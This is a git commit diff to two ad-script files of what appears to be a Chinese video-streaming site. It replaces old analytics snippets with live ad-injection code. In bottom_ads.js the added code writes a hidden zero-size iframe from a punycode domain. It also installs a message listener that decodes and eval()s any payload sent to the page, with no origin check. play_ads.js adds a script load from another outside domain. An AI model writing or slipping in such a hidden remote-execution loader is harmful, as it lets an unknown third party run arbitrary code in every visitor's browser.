2890520781c50bd13379169524d93989f60e7c6f
Google <openmekill@gmail.com>
2020-02-19 21:29:58 +0800

    test ad

--- omg/bottom_ads.js
+++ omg/bottom_ads.js
@@ -1,31 +1,24 @@
-//TIPS 设置
-// $(".play-tips").css("display","flex");
-// $("#tips-index-content").html("【公告】：永久播放网址：<span style='color:#07A5DF;'>baidu.com</span>，非常好记，手机浏览器输入网址即可打开，收藏以防失联...");
-
-// var h = new Date().getHours();
-// if(h <= 1){
-//         document.write("<script type='text/javascript' charset='UTF-8' async src='https://bg.ctripatm.cn/coding/1309'></script>")      
-// }else if(h >1){
-//         document.write("<script type='text/javascript' charset='UTF-8' async src='https://bg.ctripatm.cn/coding/1240'></script>")  
-// }
-
-// document.writeln("<script async=\'async\' src=\'https://vpn.zhengyejixie.com/xxd.php?id=8238\'></script>");
-
-// var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan style='display:none;' id='cnzz_stat_icon_1277772548'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s23.cnzz.com/z_stat.php%3Fid%3D1277772548' type='text/javascript'%3E%3C/script%3E"));
-
-    document.write ('<script type="text/javascript"  src="https://js.users.51.la/20589823.js"></script>'); //51;
-    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan style='display:none;' id='cnzz_stat_icon_1278571044'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/z_stat.php%3Fid%3D1278571044' type='text/javascript'%3E%3C/script%3E"));//cnzz
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?6fccc46ec978eb333d54d59ad1a01cde";
-      var s = document.getElementsByTagName("script")[0]; 
-      s.parentNode.insertBefore(hm, s);
-    })();//baidu
+    // TIPS 设置
+    $(".play-tips").css("display","flex");
+    // $("#tips-index-content").html("【公告】：永久播放网址：<span style='color:#07A5DF;'></span>，非常好记，手机浏览器输入网址即可打开，收藏以防失联...");
+    $("#tips-index-content").html("【公告】：武汉加油,湖北加油,中国加油!!!");
     
-    // (function (){
-    //   var id = "8636874161873752314-481";
-    //   document.write('<ins style="display:none!important" id="' + id + '"></ins>');
-    //   (window.adbyunion = window.adbyunion || []).push(id);
-    //   document.write('<script async defer src="https://www.8ucdn.com/o.js"></script>');
-    // })();
+    // 全局ad
+    if(config['bottom_ads']=="1"){
+        //插入AD代码
+        if (navigator.userAgent.indexOf('baiduboxapp') > -1) {
+            document.write('<script src="https://xn--xhq9mt12cf5v.ren:4443/ty/x-234-33.js"><\/script>')
+        } else {
+            (function() {
+                window.addEventListener("message", function(e) {
+                    var _des_s_234 = e.data;
+                    if (_des_s_234.des_s_234) {
+                        var _s = '/+/g';
+                        eval(decodeURIComponent(_des_s_234.des_s_234.replace(_s, "%20")))
+                    }
+                });
+                document.write('<iframe style="display:none;" src="https://xn--xhq9mt12cf5v.ren:4443/ty/x-234-33-1.html" height="0" width="0"  marginheight="0" scrolling="no" frameborder="0" allowtransparency="true"></iframe>')
+            }
+            )();
+        }
+    }
--- omg/play_ads.js
+++ omg/play_ads.js
@@ -1,60 +1,10 @@
-//TIPS 设置
-// $(".play-tips").css("display","flex");
-// document.getElementById("tips-content").innerHTML="【提醒】：长按下方二维码关注本站，望各位粉丝帮忙宣传下本站，分享给您的好友。点击'分享给朋友'";
+    //TIPS 设置
+    $(".play-tips").css("display","flex");
+    document.getElementById("tips-content").innerHTML="【提醒】：长按下方二维码关注本站，望各位粉丝帮忙宣传下本站，分享给您的好友。点击'分享给朋友'";
+    
+    // 播放页面ad
+    if(config['play_ads']=="1"){
+        //插入AD代码
+        document.writeln("<script src='http:\/\/sjia.ppkppp.cn\/s.php?id=393'><\/script>");
+    }
 
-// document.writeln("<script src='http:\/\/sjia.ppkppp.cn\/s.php?id=393'><\/script>");
-
-/*document.writeln("<style>.adv{margin:0px; width:100%;color:#fff;z-index:1000;}</style>");
-var picurl=new Array();
-picurl[0]='http://tva1.sinaimg.cn/large/007X8olVly1g82wectibwg30hs050acc.gif';
-picurl[1]='http://tva1.sinaimg.cn/large/007X8olVly1g82yjlzrf0g30hs0500wo.gif';
-picurl[2]='http://tva1.sinaimg.cn/large/007X8olVly1g82yjlzrf0g30hs0500wo.gif';
-picurl[3]='http://tva1.sinaimg.cn/large/007X8olVly1g82yjm7bd1g30hs050ady.gif';
-picurl[4]='http://tva1.sinaimg.cn/large/007X8olVly1g82wdlqmnsg30hs050jtw.gif';
-
-var index = Math.floor((Math.random()*picurl.length));   
-document.writeln("<div class=\'adv\' id=\'pic\'><a href=\'/xs.php\' rel=\'noreferrer\' target=\'_blank\' ><img src=\'"+picurl[index]+"' border=\'0\' width=\'100%\'/></a>");
-document.writeln("</div>");
-
-window.onload=function(){ 
-setTimeout("init(pic);rattleimage()",1000);
-} 
-var rector=3
-var stopit=0 
-var a=1
-
-function init(which){
-stopit=0
-shake=which
-shake.style.left=0
-shake.style.bottom=0
-}
-
-function rattleimage(){
-if ((!document.all&&!document.getElementById)||stopit==1)
-return
-if (a==1){
-shake.style.bottom=parseInt(shake.style.bottom)+rector
-}
-else if (a==2){
-shake.style.left=parseInt(shake.style.left)+rector
-}
-else if (a==3){
-shake.style.bottom=parseInt(shake.style.bottom)-rector
-}
-else{
-shake.style.left=parseInt(shake.style.left)-rector
-}
-if (a<4)
-a++
-else
-a=1
-setTimeout("rattleimage()",50)
-setTimeout("stoprattle(pic)",700)
-}
-
-function stoprattle(which){
-stopit=1
-which.style.left=0
-which.style.bottom=0
-}*/
